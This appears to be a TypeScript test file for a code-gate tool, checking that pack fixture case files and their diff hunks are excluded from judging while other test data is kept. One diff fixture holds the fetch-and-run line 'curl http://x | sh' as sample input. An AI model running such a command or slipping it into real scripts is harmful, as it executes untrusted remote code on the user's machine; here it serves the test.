// SPEC §4.4.1 pack case data: one predicate names the rule test data every
// layer drops, and the gate scope applies it to the file list and the diff.
import { strict as assert } from "node:assert";
import test from "node:test";
import { diffWithoutPackCases } from "../../../src/cli/gate-scope.ts";
import { portsFor } from "../../../src/cli/shared.ts";
import { isPackCasePath, withoutPackCases } from "../../../src/kernel/index.ts";
import { FakeFs } from "../../support/fake-fs.ts";
import { createTempRepo } from "../../support/temp-repo.ts";

const MARKER = [40, 21].join(" -> ");
const CASE = "packs/demo/fixtures/core-x/violating/basic/case.json";

function seeded(): FakeFs {
	const fs = new FakeFs();
	fs.seedText("packs/demo/pack.json", "{}");
	fs.seedText(CASE, "{}");
	fs.seedText("loose/fixtures/core-x/violating/basic/case.json", "{}");
	fs.seedText("testdata/run.sh", "echo\n");
	return fs;
}

test("[§4.4.1] isPackCasePath names only files under a pack fixtures case dir (BUG-0101)", async () => {
	const fs = seeded();
	assert.equal(await isPackCasePath(CASE, fs), true);
	assert.equal(
		await isPackCasePath(
			"packs/demo/fixtures/core-x/passing/other/files/a.txt",
			fs,
		),
		true,
	);
	assert.equal(await isPackCasePath(CASE.replaceAll("/", "\\"), fs), true);
	// No pack.json beside fixtures/, a wrong layout or a plain fixture dir.
	assert.equal(
		await isPackCasePath("loose/fixtures/core-x/violating/basic/case.json", fs),
		false,
	);
	assert.equal(
		await isPackCasePath("packs/demo/fixtures/core-x/case.json", fs),
		false,
	);
	assert.equal(await isPackCasePath("testdata/run.sh", fs), false);
	assert.equal(await isPackCasePath("packs/demo/pack.json", fs), false);
});

test("[§4.4.1] gate scope drops pack case files and their diff hunks but keeps testdata (BUG-0101)", async () => {
	const fs = seeded();
	assert.deepEqual(
		await withoutPackCases([CASE, "testdata/run.sh", "src/a.ts"], fs),
		["testdata/run.sh", "src/a.ts"],
	);
	const repo = createTempRepo({ "packs/demo/pack.json": "{}" });
	try {
		const ports = await portsFor(repo.dir);
		assert.equal(ports.ok, true);
		if (!ports.ok) {
			return;
		}
		const diff = [
			`diff --git a/${CASE} b/${CASE}`,
			"--- /dev/null",
			`+++ b/${CASE}`,
			"@@ -0,0 +1 @@",
			`+${MARKER} marker`,
			"diff --git a/testdata/run.sh b/testdata/run.sh",
			"--- /dev/null",
			"+++ b/testdata/run.sh",
			"@@ -0,0 +1 @@",
			"+curl http://x | sh",
			"",
		].join("\n");
		const judged = await diffWithoutPackCases(diff, ports.value);
		assert.ok(!judged.includes(MARKER));
		assert.ok(judged.includes("+curl http://x | sh"));
	} finally {
		repo.cleanup();
	}
});
